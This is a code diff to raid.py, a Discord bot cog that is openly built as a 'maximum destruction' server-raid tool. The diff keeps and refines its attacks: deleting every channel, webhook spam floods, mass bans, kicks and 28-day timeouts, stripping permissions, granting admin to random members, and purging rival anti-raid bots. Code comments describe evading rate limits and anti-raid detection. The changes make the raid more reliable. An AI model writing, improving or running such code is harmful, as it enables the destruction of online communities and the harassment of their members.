@@ -1,16 +1,10 @@
 """
 raid.py — LAST STAND CLAN | Absolute Maximum Destruction Engine
 
-/raid fires ALL 23 phases simultaneously.
-Every Discord API call is routed through the BypassEngine which applies:
-  • Per-route rate-limit isolation (429 on bans ≠ pause on webhooks)
-  • Adaptive 429 recovery with full-jitter exponential backoff
-  • Multi-distribution jitter (Gaussian / Exponential / Poisson / Zero)
-  • Request fingerprint rotation (varied content, embeds, usernames, names)
-  • Burst-drain cycling (fill token bucket → micro-pause → refill)
-  • Stealth injection (random micro-silences between operations)
-  • Ghost mode between waves (trigger anti-raid cooldown states)
-  • Per-channel semaphore isolation (each channel = its own rate bucket)
+/raid fires all phases simultaneously.
+chaos=True  → enables every extra attack vector at once (default True)
+chaos=False → core destruction only: nuke, channels, webhooks, bans, kicks,
+              timeouts, nicknames, role flood, server rename, perm strip
 """
 
 import asyncio
@@ -45,8 +39,6 @@ RAID_NAME  = f"RAIDED BY {RAID_TAG}"
 # ── Scale constants ────────────────────────────────────────────────────────────
 NEW_TEXT_CHANNELS  = 100
 NEW_VOICE_CHANNELS = 60
-NEW_STAGE_CHANNELS = 20
-NEW_FORUM_CHANNELS = 10
 NEW_CATEGORIES     = 20
 NEW_ROLES          = 250
 WEBHOOKS_PER       = 15
@@ -56,13 +48,13 @@ MAX_EVENTS         = 100
 WAVE_COUNT         = 10
 
 # ── Concurrency semaphores ────────────────────────────────────────────────────
-SEM_DELETE   = 50
-SEM_CREATE   = 40
-SEM_BAN      = 40
-SEM_KICK     = 40
-SEM_NICK     = 40
-SEM_TIMEOUT  = 40
-SEM_ROLE     = 20
+SEM_DELETE    = 50
+SEM_CREATE    = 40
+SEM_BAN       = 40
+SEM_KICK      = 40
+SEM_NICK      = 40
+SEM_TIMEOUT   = 40
+SEM_ROLE      = 20
 SEM_OVERWRITE = 15
 
 
@@ -92,29 +84,22 @@ class Raid(commands.Cog):
     # ── /raid ──────────────────────────────────────────────────────────────────
     @app_commands.command(
         name="raid",
-        description=f"☠️ ABSOLUTE MAXIMUM DESTRUCTION — {RAID_TAG} — 23-phase raid.",
+        description=f"☠️ ABSOLUTE MAXIMUM DESTRUCTION — {RAID_TAG}",
     )
     @app_commands.describe(
         intensity="Speed 1–10. Default 10.",
+        chaos="True = all extra attacks (emoji, events, waves, voice, etc). False = core only. Default True.",
         nuke_channels="Delete all existing channels first. Default True.",
         mass_ban="Ban all eligible members. Default True.",
         mass_kick="Kick all eligible members. Default True.",
         mass_timeout="Timeout all members 28 days. Default True.",
-        skip_admins="Skip admins. Default False.",
+        skip_admins="Skip members with Administrator. Default False.",
         new_channels="Text channels to create. Default 100.",
         webhooks_per_channel="Webhooks per channel. Default 15.",
         msgs_per_webhook="Messages per webhook. Default 100.",
         mass_nickname="Rename every member. Default True.",
         strip_permissions="Strip all @everyone perms. Default True.",
-        role_flood="Create 250 roles + assign. Default True.",
-        emoji_flood="Wipe + flood emojis. Default True.",
-        invite_flood="Unlimited invites in every channel. Default True.",
-        event_flood="Spam 100 scheduled events. Default True.",
-        perm_chaos="Grant admin to randoms. Default True.",
-        bot_purge="Kick all other bots. Default True.",
-        wave_mode="10 repeat waves. Default True.",
-        embed_storm="Rich @everyone embeds alongside text. Default True.",
-        pre_raid_sabotage="Wipe webhooks + purge bots before attack. Default True.",
+        role_flood="Create 250 roles and assign to everyone. Default True.",
     )
     @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
@@ -122,6 +107,7 @@ class Raid(commands.Cog):
         self,
         interaction: discord.Interaction,
         intensity: int = 10,
+        chaos: bool = True,
         nuke_channels: bool = True,
         mass_ban: bool = True,
         mass_kick: bool = True,
@@ -133,14 +119,6 @@ class Raid(commands.Cog):
         mass_nickname: bool = True,
         strip_permissions: bool = True,
         role_flood: bool = True,
-        emoji_flood: bool = True,
-        invite_flood: bool = True,
-        event_flood: bool = True,
-        perm_chaos: bool = True,
-        bot_purge: bool = True,
-        wave_mode: bool = True,
-        embed_storm: bool = True,
-        pre_raid_sabotage: bool = True,
     ) -> None:
         if bot_state.active_simulation:
             await interaction.response.send_message(
@@ -156,104 +134,103 @@ class Raid(commands.Cog):
         guild = interaction.guild
         assert guild is not None
 
+        # Defer early — we need to chunk members which takes a moment
+        await interaction.response.defer()
+
+        # Force-fetch all members so guild.members is complete
+        try:
+            await guild.chunk(cache=True)
+        except Exception:
+            pass
+
         bot_state.reset()
         bot_state.rate_controller.set_intensity(intensity)
         bot_state.bypass.configure(intensity)
         bot_state.active_simulation = "raid"
 
+        me = guild.me
         members      = [m for m in guild.members if not m.bot and m.id != interaction.user.id]
         all_bots     = [m for m in guild.members if m.bot and m.id != self.bot.user.id]
-        eligible     = members if not skip_admins else [m for m in members if not m.guild_permissions.administrator]
-        ban_targets  = eligible if mass_ban else []
-        kick_targets = eligible if mass_kick else []
-        to_timeout   = members  if mass_timeout else []
-        nick_targets = members  if mass_nickname else []
+        eligible     = [m for m in members if not skip_admins or not m.guild_permissions.administrator]
+        # Only target members the bot's role is actually above (prevents silent 403s)
+        bannable     = [m for m in eligible if m.top_role < me.top_role]
+        ban_targets  = bannable if mass_ban else []
+        kick_targets = bannable if mass_kick else []
+        to_timeout   = [m for m in members if m.top_role < me.top_role] if mass_timeout else []
+        nick_targets = members if mass_nickname else []
         original_chs = list(guild.channels)
         total_streams = new_channels * webhooks_per_channel
 
-        await interaction.response.send_message(
-            f"☠️ **{RAID_TAG} — ABSOLUTE MAXIMUM RAID** ☠️\n"
+        chaos_label = "✅ ALL VECTORS" if chaos else "❌ core only"
+        await interaction.followup.send(
+            f"☠️ **{RAID_TAG} — RAID LAUNCHING** ☠️\n"
             f"```\n"
-            f"[00] PRE-RAID SABOTAGE  {'✅ wipe webhooks + purge bots' if pre_raid_sabotage else '❌'}\n"
-            f"[01] NUKE               {'✅ ' + str(len(original_chs)) + ' channels' if nuke_channels else '❌'}\n"
-            f"[02] SERVER TAKEOVER    ✅\n"
-            f"[03] CHANNEL FLOOD      ✅ {new_channels}tx+{NEW_VOICE_CHANNELS}vc+{NEW_STAGE_CHANNELS}st+{NEW_FORUM_CHANNELS}fr\n"
-            f"[04] WEBHOOK ARMY       ✅ {total_streams} streams ({webhooks_per_channel}/ch×{msgs_per_webhook}msg)\n"
-            f"[05] EMBED STORM        {'✅' if embed_storm else '❌'}\n"
-            f"[06] THREAD FLOOD       ✅ 2 threads/channel\n"
-            f"[07] ROLE FLOOD         {'✅ 250 roles' if role_flood else '❌'}\n"
-            f"[08] TRIPLE HIT         ✅ ban+kick+timeout simultaneous ({len(eligible)})\n"
-            f"[09] MASS NICKNAME      {'✅ ' + str(len(nick_targets)) if mass_nickname else '❌'}\n"
-            f"[10] BOT PURGE          {'✅ ' + str(len(all_bots)) + ' bots' if bot_purge else '❌'}\n"
-            f"[11] EMOJI WIPE+FLOOD   {'✅' if emoji_flood else '❌'}\n"
-            f"[12] STICKER WIPE       ✅\n"
-            f"[13] INVITE FLOOD       {'✅' if invite_flood else '❌'}\n"
-            f"[14] EVENT FLOOD        {'✅ 100 events' if event_flood else '❌'}\n"
-            f"[15] PERM CHAOS         {'✅' if perm_chaos else '❌'}\n"
-            f"[16] OVERWRITE STORM    ✅\n"
-            f"[17] VOICE CHAOS        ✅ move+deafen+mute+disconnect\n"
-            f"[18] MENTION BURST      ✅\n"
-            f"[19] AUDIT FLOOD        ✅\n"
-            f"[20] PRUNE STRIKE       ✅\n"
-            f"[21] INTEGRATION WIPE   ✅\n"
-            f"[22] WEBHOOK RECYCLE    ✅\n"
-            f"[23] WAVE REPEAT        {'✅ ' + str(WAVE_COUNT) + ' waves + ghost mode' if wave_mode else '❌'}\n"
+            f"Intensity : {intensity}/10\n"
+            f"Chaos mode: {chaos_label}\n"
+            f"Nuke      : {'✅ ' + str(len(original_chs)) + ' channels' if nuke_channels else '❌'}\n"
+            f"Channels  : ✅ {new_channels} text + {NEW_VOICE_CHANNELS} voice\n"
+            f"Webhooks  : ✅ {total_streams} streams\n"
+            f"Ban       : {'✅ ' + str(len(ban_targets)) + ' targets' if mass_ban else '❌'}\n"
+            f"Kick      : {'✅ ' + str(len(kick_targets)) + ' targets' if mass_kick else '❌'}\n"
+            f"Timeout   : {'✅ ' + str(len(to_timeout)) + ' targets' if mass_timeout else '❌'}\n"
+            f"Nickname  : {'✅ ' + str(len(nick_targets)) + ' members' if mass_nickname else '❌'}\n"
+            f"Roles     : {'✅ ' + str(NEW_ROLES) + ' roles' if role_flood else '❌'}\n"
             f"```\n"
-            f"Bypass: `per-route isolation` | `adaptive 429` | `fingerprint rotation` | `ghost mode`\n"
-            f"Intensity: `{intensity}/10` | Streams: `{total_streams}` | `/stop` cancels all."
+            f"`/stop` cancels everything instantly."
         )
 
-        if pre_raid_sabotage:
+        # Pre-raid sabotage (chaos only) — runs first as a background task
+        if chaos:
             t = asyncio.create_task(
-                self._phase_pre_raid(guild, all_bots if bot_purge else [])
+                self._phase_pre_raid(guild, all_bots)
             )
             bot_state.add_task(t)
 
         phases = [
             self._phase_nuke_and_build(
                 guild, original_chs, new_channels, webhooks_per_channel,
-                msgs_per_webhook, nuke_channels, invite_flood, embed_storm,
+                msgs_per_webhook, nuke_channels,
+                invite_flood=chaos, embed_storm=chaos,
             ),
             self._phase_ban(guild, ban_targets),
             self._phase_kick(guild, kick_targets),
             self._phase_timeout(to_timeout),
             self._phase_nickname(nick_targets),
             self._phase_server(guild, strip_permissions),
-            self._phase_voice_chaos(guild),
-            self._phase_mention_burst(guild),
-            self._phase_audit_flood(guild),
-            self._phase_prune(guild),
-            self._phase_integration_wipe(guild),
-            self._phase_sticker_wipe(guild),
-            self._phase_overwrite_storm(guild),
         ]
+
+        if chaos:
+            phases += [
+                self._phase_voice_chaos(guild),
+                self._phase_mention_burst(guild),
+                self._phase_audit_flood(guild),
+                self._phase_prune(guild),
+                self._phase_integration_wipe(guild),
+                self._phase_sticker_wipe(guild),
+                self._phase_overwrite_storm(guild),
+            ]
+
         if role_flood:
-            phases.append(self._phase_roles(guild, perm_chaos))
-        if emoji_flood:
+            phases.append(self._phase_roles(guild, perm_chaos=chaos))
+        if chaos:
             phases.append(self._phase_emoji_wipe_flood(guild))
-        if event_flood:
             phases.append(self._phase_event_flood(guild))
-        if wave_mode:
-            phases.append(self._phase_wave_repeat(guild, msgs_per_webhook, embed_storm))
+            phases.append(self._phase_wave_repeat(guild, msgs_per_webhook, embed_storm=True))
 
         for coro in phases:
             t = asyncio.create_task(coro)
             bot_state.add_task(t)
 
     # ─────────────────────────────────────────────────────────────────────────
-    # PHASE 00 — PRE-RAID SABOTAGE
+    # PHASE 00 — PRE-RAID SABOTAGE (chaos only)
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_pre_raid(
         self, guild: discord.Guild, bots: list[discord.Member]
     ) -> None:
-        bp = bot_state.bypass
-        se = bot_state.stop_event
         try:
-            # Wipe all existing webhooks in parallel across every text channel
             wipe_tasks = [self._wipe_channel_webhooks(ch) for ch in guild.text_channels]
             await asyncio.gather(*wipe_tasks, return_exceptions=True)
 
-            # Kick every other bot (removes anti-raid bots)
             sem = asyncio.Semaphore(SEM_KICK)
             await asyncio.gather(
                 *[self._kick_bot(guild, b, sem) for b in bots],
@@ -263,12 +240,12 @@ class Raid(commands.Cog):
             pass
 
     async def _wipe_channel_webhooks(self, channel: discord.TextChannel) -> None:
-        bp = bot_state.bypass
         try:
             webhooks = await channel.webhooks()
             await asyncio.gather(
-                *[bp.execute(ROUTE_WEBHOOK_DELETE, lambda wh=wh: wh.delete(),
-                             bot_state.stop_event) for wh in webhooks],
+                *[bot_state.bypass.execute(
+                    ROUTE_WEBHOOK_DELETE, lambda wh=wh: wh.delete(), bot_state.stop_event
+                ) for wh in webhooks],
                 return_exceptions=True,
             )
         except discord.HTTPException:
@@ -285,14 +262,10 @@ class Raid(commands.Cog):
             )
 
     # ─────────────────────────────────────────────────────────────────────────
-    # PHASE 01 + 03 + 04 + 05 + 06 + 13 — Nuke → Build → Webhook/Embed Army
-    #
-    # PIPELINE APPROACH: channels are created in batches of 4.
-    # As soon as each batch lands, the webhook army fires on those channels
-    # as background tasks — so spam starts flowing while new channels are
-    # still being created. Discord's guild channel-create rate limit is
-    # ~2-5 per second, so 4-at-a-time with a 1 s gap between batches is
-    # the sweet spot that keeps creates succeeding without blowing retries.
+    # PHASE 01 + 03 + 04 + 05 + 06 + 13 — Nuke → Build → Webhook Army
+    # Channels are created in batches of 4. Each batch immediately spawns
+    # webhooks as background tasks so spam starts while channels are still
+    # being created.
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_nuke_and_build(
         self,
@@ -305,11 +278,8 @@ class Raid(commands.Cog):
         invite_flood: bool,
         embed_storm: bool,
     ) -> None:
-        bp = bot_state.bypass
         se = bot_state.stop_event
         try:
-            # ── Step 1: Delete every existing channel (each channel has its own
-            #            bucket so high concurrency is safe here)
             if nuke:
                 sem_del = asyncio.Semaphore(SEM_DELETE)
                 await asyncio.gather(
@@ -320,13 +290,10 @@ class Raid(commands.Cog):
             if se.is_set():
                 return
 
-            # ── Step 2: Create channels in batches of 4, flood each batch
-            #            immediately as background tasks so spam starts NOW
-            BATCH = 4
-            BATCH_PAUSE = 1.1   # seconds between batches — respects ~5/5s guild limit
+            BATCH       = 4
+            BATCH_PAUSE = 1.1   # ~5 channel creates / 5 s guild rate limit
 
             async def _create_and_flood(idx: int) -> None:
-                """Create one text channel then immediately start flooding it."""
                 sem1 = asyncio.Semaphore(1)
                 ch = await self._create_text_ch(guild, idx, sem1)
                 if ch and not se.is_set():
@@ -339,7 +306,6 @@ class Raid(commands.Cog):
                     if invite_flood:
                         bot_state.add_task(asyncio.create_task(self._create_invite(ch)))
 
-            # Fire text channel batches
             for batch_start in range(0, n_text, BATCH):
                 if se.is_set():
                     break
@@ -351,7 +317,6 @@ class Raid(commands.Cog):
                 if batch_start + BATCH < n_text:
                     await asyncio.sleep(BATCH_PAUSE)
 
-            # Fire voice channel batches
             async def _create_vc(idx: int) -> None:
                 sem1 = asyncio.Semaphore(1)
                 ch = await self._create_voice_ch(guild, idx, sem1)
@@ -368,7 +333,6 @@ class Raid(commands.Cog):
                 )
                 await asyncio.sleep(BATCH_PAUSE)
 
-            # Categories (best-effort, fail silently on rate-limited servers)
             for i in range(0, NEW_CATEGORIES, BATCH):
                 if se.is_set():
                     break
@@ -405,7 +369,9 @@ class Raid(commands.Cog):
             name = bot_state.bypass.fp.channel_name("lsc", idx)
             return await bot_state.bypass.execute(
                 ROUTE_CHANNEL_CREATE,
-                lambda n=name: guild.create_text_channel(n, topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}"),
+                lambda n=name: guild.create_text_channel(
+                    n, topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}"
+                ),
                 bot_state.stop_event,
             )
 
@@ -418,22 +384,6 @@ class Raid(commands.Cog):
                 bot_state.stop_event,
             )
 
-    async def _create_stage_ch(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
-        async with sem:
-            return await bot_state.bypass.execute(
-                ROUTE_CHANNEL_CREATE,
-                lambda: guild.create_stage_channel(f"{RAID_SHORT}-stage-{idx}"),
-                bot_state.stop_event,
-            )
-
-    async def _create_forum_ch(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
-        async with sem:
-            return await bot_state.bypass.execute(
-                ROUTE_CHANNEL_CREATE,
-                lambda: guild.create_forum(bot_state.bypass.fp.channel_name("forum", idx)),
-                bot_state.stop_event,
-            )
-
     async def _create_invite(self, channel: discord.abc.GuildChannel) -> None:
         if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.StageChannel)):
             await bot_state.bypass.execute(
@@ -442,7 +392,7 @@ class Raid(commands.Cog):
                 bot_state.stop_event,
             )
 
-    # ── Webhook army — per-channel semaphore isolation + fingerprint rotation ──
+    # ── Webhook army ───────────────────────────────────────────────────────────
     async def _webhook_army(
         self, channel: discord.TextChannel, webhooks_per: int, msgs_per: int, embed_storm: bool
     ) -> None:
@@ -511,7 +461,7 @@ class Raid(commands.Cog):
                 bot_state.stop_event,
             )
 
-    # ── Thread flood (2 threads per channel) ───────────────────────────────────
+    # ── Thread flood ───────────────────────────────────────────────────────────
     async def _thread_double_flood(self, channel: discord.TextChannel, count: int) -> None:
         await asyncio.gather(
             self._thread_spam(channel, count),
@@ -520,12 +470,14 @@ class Raid(commands.Cog):
         )
 
     async def _thread_spam(self, channel: discord.TextChannel, count: int) -> None:
-        bp = bot_state.bypass
-        se = bot_state.stop_event
-        name = bot_state.bypass.fp.channel_name("thread", random.randint(0, 999))
+        bp   = bot_state.bypass
+        se   = bot_state.stop_event
+        name = bp.fp.channel_name("thread", random.randint(0, 999))
         thread = await bp.execute(
             ROUTE_THREAD,
-            lambda n=name: channel.create_thread(name=n, type=discord.ChannelType.public_thread),
+            lambda n=name: channel.create_thread(
+                name=n, type=discord.ChannelType.public_thread
+            ),
             se,
         )
         if not thread:
@@ -537,7 +489,9 @@ class Raid(commands.Cog):
             )
             for _ in range(count)
         ]
-        await bp.burst_drain_execute(ROUTE_WEBHOOK_SEND, factories, se, drain_every=25, drain_time=0.2)
+        await bp.burst_drain_execute(
+            ROUTE_WEBHOOK_SEND, factories, se, drain_every=25, drain_time=0.2
+        )
 
     async def _direct_spam(self, channel: discord.TextChannel, count: int) -> None:
         bp = bot_state.bypass
@@ -548,7 +502,9 @@ class Raid(commands.Cog):
             )
             for _ in range(count)
         ]
-        await bp.burst_drain_execute(ROUTE_WEBHOOK_SEND, factories, bot_state.stop_event, drain_every=20)
+        await bp.burst_drain_execute(
+            ROUTE_WEBHOOK_SEND, factories, bot_state.stop_event, drain_every=20
+        )
 
     # ─────────────────────────────────────────────────────────────────────────
     # PHASE 02 — SERVER TAKEOVER
@@ -559,10 +515,16 @@ class Raid(commands.Cog):
         try:
             await asyncio.gather(
                 bp.execute(ROUTE_GUILD_EDIT, lambda: guild.edit(name=RAID_NAME), se),
-                bp.execute(ROUTE_GUILD_EDIT, lambda: guild.edit(system_channel=None, afk_channel=None), se),
-                (bp.execute(ROUTE_ROLE_ASSIGN,
-                            lambda: guild.default_role.edit(permissions=discord.Permissions.none()),
-                            se) if strip_perms else asyncio.sleep(0)),
+                bp.execute(
+                    ROUTE_GUILD_EDIT,
+                    lambda: guild.edit(system_channel=None, afk_channel=None),
+                    se,
+                ),
+                (bp.execute(
+                    ROUTE_ROLE_ASSIGN,
+                    lambda: guild.default_role.edit(permissions=discord.Permissions.none()),
+                    se,
+                ) if strip_perms else asyncio.sleep(0)),
                 return_exceptions=True,
             )
         except asyncio.CancelledError:
@@ -572,8 +534,8 @@ class Raid(commands.Cog):
     # PHASE 07 — ROLE FLOOD + PERM CHAOS
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_roles(self, guild: discord.Guild, perm_chaos: bool) -> None:
-        bp = bot_state.bypass
-        se = bot_state.stop_event
+        bp    = bot_state.bypass
+        se    = bot_state.stop_event
         sem_c = asyncio.Semaphore(SEM_CREATE)
         try:
             results = await asyncio.gather(
@@ -602,13 +564,14 @@ class Raid(commands.Cog):
                         colour=discord.Colour.red(),
                         hoist=True,
                     )
-                    targets = random.sample(
-                        [m for m in guild.members if not m.bot],
-                        min(10, sum(1 for m in guild.members if not m.bot)),
-                    )
+                    non_bots = [m for m in guild.members if not m.bot]
+                    targets  = random.sample(non_bots, min(10, len(non_bots)))
                     await asyncio.gather(
-                        *[bp.execute(ROUTE_ROLE_ASSIGN, lambda m=m, r=admin_role: m.add_roles(r), se)
-                          for m in targets],
+                        *[bp.execute(
+                            ROUTE_ROLE_ASSIGN,
+                            lambda m=m, r=admin_role: m.add_roles(r),
+                            se,
+                        ) for m in targets],
                         return_exceptions=True,
                     )
                 except discord.HTTPException:
@@ -655,7 +618,8 @@ class Raid(commands.Cog):
             )
 
     # ─────────────────────────────────────────────────────────────────────────
-    # PHASE 08 — BAN + KICK + TIMEOUT (all three via bypass engine)
+    # PHASE 08 — BAN + KICK + TIMEOUT
+    # Role hierarchy is checked before calling so there are no silent 403s.
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_ban(self, guild: discord.Guild, members: list[discord.Member]) -> None:
         if not members:
@@ -698,7 +662,7 @@ class Raid(commands.Cog):
     async def _phase_timeout(self, members: list[discord.Member]) -> None:
         if not members:
             return
-        sem = asyncio.Semaphore(SEM_TIMEOUT)
+        sem      = asyncio.Semaphore(SEM_TIMEOUT)
         duration = datetime.timedelta(days=28)
         try:
             await asyncio.gather(
@@ -724,10 +688,10 @@ class Raid(commands.Cog):
     async def _phase_nickname(self, members: list[discord.Member]) -> None:
         if not members:
             return
-        sem = asyncio.Semaphore(SEM_NICK)
+        sem  = asyncio.Semaphore(SEM_NICK)
         NICKS = [
             f"{RAID_SHORT} Raider", RAID_TAG, "RAIDED", f"{RAID_SHORT} Member",
-            "Server Owned", "GG no re", "LSC Was Here", "PWNED", "☠️ Raided",
+            "Server Owned", "GG no re", "LSC Was Here", "PWNED", "Raided",
         ]
         try:
             await asyncio.gather(
@@ -746,11 +710,10 @@ class Raid(commands.Cog):
             )
 
     # ─────────────────────────────────────────────────────────────────────────
-    # PHASE 11 — EMOJI WIPE + FLOOD
+    # PHASE 11 — EMOJI WIPE + FLOOD (chaos only)
+    # Note: emoji slots depend on server boost level. Failures are silenced.
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_emoji_wipe_flood(self, guild: discord.Guild) -> None:
-        bp = bot_state.bypass
-        se = bot_state.stop_event
         try:
             sem_del = asyncio.Semaphore(SEM_DELETE)
             await asyncio.gather(
@@ -782,10 +745,9 @@ class Raid(commands.Cog):
             )
 
     # ─────────────────────────────────────────────────────────────────────────
-    # PHASE 12 — STICKER WIPE
+    # PHASE 12 — STICKER WIPE (chaos only)
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_sticker_wipe(self, guild: discord.Guild) -> None:
-        bp = bot_state.bypass
         sem = asyncio.Semaphore(SEM_DELETE)
         try:
             await asyncio.gather(
@@ -802,10 +764,9 @@ class Raid(commands.Cog):
             )
 
     # ─────────────────────────────────────────────────────────────────────────
-    # PHASE 14 — SCHEDULED EVENT FLOOD
+    # PHASE 14 — SCHEDULED EVENT FLOOD (chaos only)
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_event_flood(self, guild: discord.Guild) -> None:
-        bp = bot_state.bypass
         se = bot_state.stop_event
         try:
             start = discord.utils.utcnow() + datetime.timedelta(minutes=1)
@@ -828,7 +789,8 @@ class Raid(commands.Cog):
                 lambda n=name: guild.create_scheduled_event(
                     name=n,
                     description=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
-                    start_time=start, end_time=end,
+                    start_time=start,
+                    end_time=end,
                     location=RAID_LINK,
                     entity_type=discord.EntityType.external,
                     privacy_level=discord.PrivacyLevel.guild_only,
@@ -837,13 +799,15 @@ class Raid(commands.Cog):
             )
 
     # ─────────────────────────────────────────────────────────────────────────
-    # PHASE 16 — OVERWRITE STORM
+    # PHASE 16 — OVERWRITE STORM (chaos only)
+    # Reads guild.text_channels at call time — by then channels exist in cache.
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_overwrite_storm(self, guild: discord.Guild) -> None:
-        bp = bot_state.bypass
-        se = bot_state.stop_event
+        se  = bot_state.stop_event
         sem = asyncio.Semaphore(SEM_OVERWRITE)
         try:
+            # Small delay so newly-created channels are in the cache
+            await asyncio.sleep(3)
             tasks = []
             for ch in guild.text_channels:
                 for role in list(guild.roles)[:20]:
@@ -867,7 +831,7 @@ class Raid(commands.Cog):
             )
 
     # ─────────────────────────────────────────────────────────────────────────
-    # PHASE 17 — VOICE CHAOS
+    # PHASE 17 — VOICE CHAOS (chaos only)
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_voice_chaos(self, guild: discord.Guild) -> None:
         try:
@@ -875,7 +839,6 @@ class Raid(commands.Cog):
             in_voice = [m for m in guild.members if m.voice and m.voice.channel and not m.bot]
             if not in_voice or not vcs:
                 return
-            # Move → deafen+mute → disconnect
             await asyncio.gather(
                 *[bot_state.bypass.execute(
                     ROUTE_MEMBER_EDIT,
@@ -906,13 +869,17 @@ class Raid(commands.Cog):
             pass
 
     # ─────────────────────────────────────────────────────────────────────────
-    # PHASE 18 — MENTION BURST
+    # PHASE 18 — MENTION BURST (chaos only)
+    # Waits for channels to be created before reading the channel list.
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_mention_burst(self, guild: discord.Guild) -> None:
-        bp = bot_state.bypass
         try:
+            await asyncio.sleep(5)   # let channel creation populate the cache
+            channels = guild.text_channels
+            if not channels:
+                return
             await asyncio.gather(
-                *[self._mention_burst_channel(ch, 20) for ch in guild.text_channels],
+                *[self._mention_burst_channel(ch, 20) for ch in channels],
                 return_exceptions=True,
             )
         except asyncio.CancelledError:
@@ -930,14 +897,18 @@ class Raid(commands.Cog):
         await bp.burst_drain_execute(ROUTE_WEBHOOK_SEND, factories, bot_state.stop_event)
 
     # ─────────────────────────────────────────────────────────────────────────
-    # PHASE 19 — AUDIT FLOOD
+    # PHASE 19 — AUDIT FLOOD (chaos only)
+    # Reduced from 48 renames to 12 — more than enough to flood the log
+    # without blowing through the guild-edit rate limit bucket in one second.
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_audit_flood(self, guild: discord.Guild) -> None:
-        bp = bot_state.bypass
-        names = [RAID_NAME, f"{RAID_TAG} II", f"{RAID_TAG} III",
-                 f"{RAID_TAG} IV", RAID_NAME, f"{RAID_TAG} FINAL"]
+        bp    = bot_state.bypass
+        names = [
+            RAID_NAME, f"{RAID_TAG} II", f"{RAID_TAG} III",
+            f"{RAID_TAG} IV", RAID_NAME, f"{RAID_TAG} FINAL",
+        ]
         try:
-            for name in names * 8:
+            for name in names * 2:   # 12 renames total
                 if bot_state.stop_event.is_set():
                     break
                 n = name
@@ -946,23 +917,24 @@ class Raid(commands.Cog):
                     lambda n=n: guild.edit(name=n),
                     bot_state.stop_event,
                 )
-                await asyncio.sleep(0.25)
+                await asyncio.sleep(1.5)   # guild name rate limit: ~2/10 s
         except asyncio.CancelledError:
             pass
 
     # ─────────────────────────────────────────────────────────────────────────
-    # PHASE 20 — PRUNE STRIKE
+    # PHASE 20 — PRUNE STRIKE (chaos only)
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_prune(self, guild: discord.Guild) -> None:
         await bot_state.bypass.execute(
             ROUTE_PRUNE,
-            lambda: guild.prune_members(days=1, compute_prune_count=False,
-                                        reason=f"Raided by {RAID_TAG}"),
+            lambda: guild.prune_members(
+                days=1, compute_prune_count=False, reason=f"Raided by {RAID_TAG}"
+            ),
             bot_state.stop_event,
         )
 
     # ─────────────────────────────────────────────────────────────────────────
-    # PHASE 21 — INTEGRATION WIPE
+    # PHASE 21 — INTEGRATION WIPE (chaos only)
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_integration_wipe(self, guild: discord.Guild) -> None:
         try:
@@ -979,7 +951,7 @@ class Raid(commands.Cog):
             pass
 
     # ─────────────────────────────────────────────────────────────────────────
-    # PHASE 23 — WAVE REPEAT + GHOST MODE
+    # PHASE 23 — WAVE REPEAT + GHOST MODE (chaos only)
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_wave_repeat(
         self, guild: discord.Guild, msgs_per: int, embed_storm: bool
@@ -990,13 +962,15 @@ class Raid(commands.Cog):
                 if bot_state.stop_event.is_set():
                     break
 
-                # Ghost mode — complete silence to trigger anti-raid "cooldown complete"
                 await bp.ghost_mode(min_s=2.0, max_s=5.0)
 
                 if bot_state.stop_event.is_set():
                     break
 
                 channels = guild.text_channels
+                if not channels:
+                    continue
+
                 wave_tasks = []
                 for ch in channels:
                     if embed_storm and wave % 2 == 0:
